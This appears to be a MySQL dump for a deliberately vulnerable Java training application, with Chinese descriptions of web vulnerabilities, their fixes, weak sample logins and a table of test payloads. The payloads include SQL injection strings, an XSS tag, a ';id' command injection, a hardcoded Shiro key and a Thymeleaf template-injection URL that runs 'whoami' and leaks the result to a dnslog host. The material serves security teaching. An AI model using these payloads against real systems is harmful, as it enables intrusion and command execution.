-- MySQL dump 10.13  Distrib 5.6.51, for osx10.16 (x86_64)
--
-- Host: 127.0.0.1    Database: java_code
-- ------------------------------------------------------
-- Server version	8.0.26

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

DROP DATABASE IF EXISTS `java_code`;
CREATE DATABASE IF NOT EXISTS `java_code`;
USE `java_code`;

--
-- Table structure for table `repaire`
--
DROP TABLE IF EXISTS `repaire`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `repaire` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `symbol` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `content` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2402 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `repaire`
--

LOCK TABLES `repaire` WRITE;
/*!40000 ALTER TABLE `repaire` DISABLE KEYS */;
INSERT INTO `repaire` VALUES (101,'sqli01','JDBC拼接SQL注入修复','在原生SQL查询中采用预编译的方式防止SQL注入漏洞产生','/sqli/jdbc/sec'),(201,'sqli02','Mybatis拼接SQL注入修复','在Mybatis框架中，使用#替代$的方式，即可使用mybatis自带的预编译机制防止SQL注入漏洞','/sqli/mybatis/sec01'),(301,'sqli03','Mybatis like SQL注入修复','在Mybatis框架中，对于mysql数据库，采用like concat的方式组合#符，可以防止like的SQL注入，如like concat(\'%\',#{name},\'%\')','/sqli/mybatis/sec02'),(401,'sqli04','Mybatis order by SQL注入','在Mybatis框架中，使用白名单对输入的列表名称进行判断或者写死列表名，即可防护SQL注入','/sqli/mybatis/sec03'),(501,'xss01','反射型XSS漏洞修复','对用户输入输出的特殊字符进行转义即可修复','/xss/reflect/sec'),(601,'xss02','存储型XSS漏洞修复','对用户输入输出的特殊字符进行转义即可修复','/xss/stored/sec'),(701,'urlredirect01','url重定向漏洞修复','对用户url进行过滤，采用黑白名单的方式进行检查，如果不符合规则就直接停止跳转','/urlRedirect/sec01'),(702,'urlredirect01','url重定向漏洞修复','使用forward，只可以跳转到路径，无法跳转到其他url','/urlRedirect/sec02'),(901,'thymeleafi01','Thymeleaf模板注入修复','升级thymeleaf到3.0.12，避免直接将用户输入参数直接跳转','null'),(1101,'xxe01','XXE漏洞修复','禁止引入外部实体，详情参考代码','/xxe/sec01'),(1201,'xxe02','XXE漏洞修复','禁止引入外部实体，详情参考代码','/xxe/sec02'),(1301,'xxe03','XXE漏洞修复','禁止引入外部实体，详情参考代码','/xxe/sec03'),(1401,'xxe04','XXE漏洞修复','禁止引入外部实体，详情参考代码','/xxe/sec04'),(1501,'xxe05','XXE漏洞修复','禁止引入外部实体，详情参考代码','/xxe/sec05'),(1601,'ssrf01','SSRF漏洞修复','采用白名单方式进行验证，示例白名单仅设置baidu.com，采用黑名单会被DNS reblinding漏洞绕过','/ssrf/sec01'),(1602,'ssrf02','SSRF漏洞修复','Hook连接函数，在连接前判断目标ip地址是否为内网ip，详情参考代码','/ssrf/sec02'),(1701,'pathtraversal01','路径穿越漏洞-任意文件读取修复','过滤用户输入的..以及/','/pathtraversal/filereadsec'),(1801,'pathtraversal02','路径穿越漏洞-路径遍历修复','过滤用户输入的..以及/','/pathtraversal/pathsec'),(1901,'idor01','越权漏洞-水平越权修复','涉及获取用户输入进行查询的地方提前进行用户权限判断，推荐使用shiro，spring security等框架，配置好路径进行权限管理','/idor/sec01'),(2001,'idor02','越权漏洞-垂直越权修复','涉及获取用户输入进行查询的地方提前进行用户权限判断，推荐使用shiro，spring security等框架,配置好路径进行权限管理','/idor/sec02'),(2101,'upload','文件上传漏洞修复','对用户上传文件进行3项判断，1.用户后缀名白名单 2.MIME类型判断，限制为图片 3.上传文件是否是图片，以防止图片马','/upload/picture'),(2201,'fastjson','Fastjson反序列化漏洞修复','1、更新fastjson组件为1.2.68以上 2、使用jackson，gson等框架，使用jackson时，建议不打开autotype，可以封装一层，把不安全的方法全部干掉。相较而言，gson安全性最高。','null'),(2301,'cmdi','OS命令执行漏洞修复','1、避免不可信数据拼接操作系统命令 2、避免创建shell操作 3、如果无法避免直接访问操作系统命令，就需要严格管理外部传入的参数，对外部传入数据进行过滤。可通过白名单限制字符类型，仅允许字符、数字、下划线；或过滤转义以下符号：|;&$><`（反引号）!','/cmdi/sec01'),(2401,'shiro','Shiro反序列化漏洞','1、自定义shiro中的key，具体可以参考代码ShiroConfig.java中 2、升级shiro至1.4.2以上版本','null');
/*!40000 ALTER TABLE `repaire` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `role` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `content` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (1,'admin','password','admin','18700000000','这是测试数据1'),(2,'user','user','user','16600000000','这是测试数据2'),(3,'ad123','passw0rd','user','150000000','测试数据3'),(4,'root','toor','user','17600000000','这是测试数据2');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `vuln`
--

DROP TABLE IF EXISTS `vuln`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `vuln` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `color` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `vuln`
--

LOCK TABLES `vuln` WRITE;
/*!40000 ALTER TABLE `vuln` DISABLE KEYS */;
INSERT INTO `vuln` VALUES (1,'SQL注入','SQL注入通过把SQL命令插入到Web表单中提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行指定的SQL语句。','scenes#SQL','#2196f3'),(2,'路径遍历','在web功能设计中，很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能变的更加灵活。 当用户发起一个前端的请求时，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。','scenes#Pathtraversal','#e91e63'),(3,'Thymeleaf注入','Thymeleaf 是与 java 配合使用的一款服务端模板引擎，也是 spring 官方支持的一款服务端模板引擎。他支持 HTML 原型，在 HTML 标签中增加额外的属性来达到模板 + 数据的展示方式。thymeleaf版本小于3.0.12存在注入漏洞，攻击者可以利用该漏洞进行命令执行。','scenes#Thymeleaf','#c3d41a'),(4,'XXE注入','XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，让处理程序解析它。','scenes#XXE','#ff9800'),(5,'XSS漏洞','XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。XSS属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。xss是一种发生在web前端的漏洞，所以其危害的对象也主要是前端用户。','scenes#XSS','#c33ada'),(6,'SSRF漏洞','SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。','scenes#SSRF','#ADD8E6'),(7,'文件上传漏洞','由于程序员在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，从而导致服务器沦陷。','scenes#Upload','#CD9B1D'),(8,'Fastjson反序列化漏洞','Fastjson是阿里巴巴开源的一款高性能Json处理库，Fastjson版本小于1.2.68版本存在反序列化漏洞，攻击者可以通过该漏洞执行任意命令。','scenes#Fastjson','#5AC5'),(9,'命令注入漏洞','命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。','scenes#Cmdi','#5A5AC5'),(10,'越权(IDOR)漏洞','越权漏洞通常是对权限校验不严格，导致当前用户可以获取其他用户信息或高权限用户功能。','scenes#IDOR','#5AC4C5'),(11,'url重定向漏洞','重定向漏洞就是利用网站正常的跳转来达到跳转攻击者指定恶意页面URL跳转以便进入下一阶段的攻击,注意该漏洞不但Web存在而且在APP中也是存在的;','scenes#URL','#C55ABE'),(12,'shiro反序列化漏洞','shiro框架是apache开源的一款权限管理框架，shiro版本<1.2.4存在shiro550反序列化漏洞，shiro版本<1.4.2存在shiro721漏洞，攻击者可以利用漏洞获取服务器权限。','scenes#SHIRO','#1756F1');
/*!40000 ALTER TABLE `vuln` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `vulnpath`
--

DROP TABLE IF EXISTS `vulnpath`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `vulnpath` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `symbol` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `content` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `url1` varchar(255) NOT NULL,
  `color` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `vulnpath`
--

LOCK TABLES `vulnpath` WRITE;
/*!40000 ALTER TABLE `vulnpath` DISABLE KEYS */;
INSERT INTO `vulnpath` VALUES (1,'sqli01','JDBC拼接SQL注入','在原生SQL查询中使用拼接的方式导致存在SQL注入漏洞 \n payload1: admin \n payload2: admin\' or \'1\'=\'1','/sqli/jdbc/vuln','scene01#sqli01','#2196f3'),(2,'sqli02','Mybatis拼接SQL注入','使用Mybatis框架是，采用$的方式进行拼接导致SQL注入漏洞 \n payload1：admin \n payload2: admin\' or \'1\'=\'1','/sqli/mybatis/vuln01','scene01#sqli02','#e91e63'),(3,'sqli03','Mybatis like SQL注入','使用Mybatis框架，like无法使用#号进行预编译查询，导致产生SQL注入。 \n payload1: ad \n payload2: ad\' or \'1\'=\'1\' #','/sqli/mybatis/vuln02','scene01#sqli03','#c3d41a'),(4,'sqli04','Mybatis order by SQL注入','使用Mybatis框架,order by无法使用#号进行预编译查询，导致SQL注入 \n payload1: 1 \n payload2: 1 desc#','/sqli/mybatis/vuln03','scene01#sqli04','#ff9800'),(5,'xss01','反射型XSS漏洞','对用户输入没有进行过滤就输出导致存在XSS漏洞。 \n payload: <img src=x onerror=alert(1)>','/xss/reflect/vuln','scene02#xss01','#2196f3'),(6,'xss02','存储型XSS漏洞','对用户输入没有进行过滤就存储进数据库，之后输出导致存在XSS漏洞 \n payload: <img src=x onerror=alert(1)> ','/xss/stored/vuln','scene02#xss02','#e91e63'),(7,'urlredirect01','url重定向漏洞',' 使用redirect前缀url的方式构建目标url导致漏洞。\n 测试url: \n http://ip:port/urlRedirect/vuln01?str=http://www.baidu.com','/urlRedirect/vuln01','scene05#url01','#2196f3'),(8,'urlredirect02','url重定向漏洞',' 使用HttpServletResponse重定向造成漏洞。\n 测试url: \n http://ip:port/urlRedirect/vuln02?str=http://www.baidu.com','/urlRedirect/vuln02','scene05#url02','#e91e63'),(9,'thymeleafi01','Thymeleaf模板注入','Thymeleaf版本小于3.0.12存在注入漏洞，攻击者可以利用该漏洞进行命令执行。本环境不支持回显。测试payload:\nhttp://ip:port/thymeleafi/vuln01?str=__$%7bT(java.lang.Runtime).getRuntime().\nexec(%22ping%20%60whoami%60.dnslog%22)\n%7d__::.x','/thymeleafi/vuln01','scene05#thymeleaf01','#2196f3'),(10,'thymeleafi02','Thymeleaf模板注入','Thymeleaf版本小于3.0.12存在注入漏洞，攻击者可以利用该漏洞进行命令执行。本环境不支持回显。测试payload:\nhttp://ip:port/thymeleafi/vuln02?str=__$%7bT(java.lang.Runtime).getRuntime().\nexec(%22ping%20%60whoami%60.dnslog%22)\n%7d__::.x','/thymeleafi/vuln02','scene05#thymeleaf02','#e91e63'),(11,'xxe01','XXE漏洞','Java中XML解析DOM4j解析时存在漏洞，所需类为SAXReader','/xxe/vuln01','scene03#xxe01','#2196f3'),(12,'xxe02','XXE漏洞','Java中XML解析DOM解析时存在漏洞，所需类为DocumentBuilderFactory，DocumentBuilder','/xxe/vuln02','scene03#xxe02','#e91e63'),(13,'xxe03','XXE漏洞','Java中XML解析JDOM解析时存在漏洞，所需类为SAXBuilder','/xxe/vuln03','scene03#xxe03','#c3d41a'),(14,'xxe04','XXE漏洞','Java中XML解析SAX解析时存在漏洞，所需类为SAXParserFactory,SAXParser,xmlReader','/xxe/vuln04','scene03#xxe04','#ff9800'),(15,'xxe05','XXE漏洞','Java中XML解析STAX解析时存在漏洞，所需类为XMLinputFactory,XMLStreamReader','/xxe/vuln05','scene03#xxe05','#c33ada'),(16,'ssrf','SSRF漏洞','直接将外部提供的url连接而不判断来源，导致漏洞产生','/ssrf/vuln01','scene06#ssrf01','#2196f3'),(17,'pathtraversal01','路径穿越漏洞-任意文件读取','直接获取用户输入的路径导致产生漏洞，产生在文件读取处','/pathtraversal/filereadvuln','scene01#fileread','#2196f3'),(18,'pathtraversal02','路径穿越漏洞-路径遍历','直接获取用户输入的路径导致产生漏洞','/pathtraversal//pathvuln','scene01#path','#e91e63'),(19,'idor01','越权漏洞-水平越权','对用户身份没有验证而直接进行查询导致漏洞,payload1:1,payload2:2','/idor/vuln01','scene01#idor01','#2196f3'),(20,'idor02','越权漏洞-垂直越权','对用户身份没有验证而直接进行查询导致漏洞,payload:直接提交即可','/idor/vuln02','scene01#idor02','#e91e63'),(21,'upload','文件上传漏洞','对用户上传文件没有进行判断或者判断不完善导致绕过从而用户可以上传任意文件，注：springboot上传jsp无法命令执行。','/upload/vuln','scene04#upload01','#2196f3'),(22,'fastjson','Fastjson反序列化漏洞','Fastjson反序列化漏洞，这里版本为1.2.24，可以执行任意命令。测试路径:/fastjson/vuln,测试payload要求为json格式,post方法','/fastjson/vuln','scene05#fastjson01','#2196f3'),(23,'cmdi','OS命令执行','对不可信的数据直接拼接到命令执行函数中导致漏洞 这里模拟列出当前目录文件操作。\n 测试payload: \n payload1: \n payload2: ;id','/cmdi/vuln01','scene01#cmdi01','#2196f3'),(24,'shiro','SHIRO反序列化漏洞','此环境shiro版本为1.2.4，存在550以及721漏洞，这里key自定义为3AvVhmFLUs0KTA3Kprsdag==','null','scene05#shiro','#2196f3');
/*!40000 ALTER TABLE `vulnpath` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-10-18 14:04:12
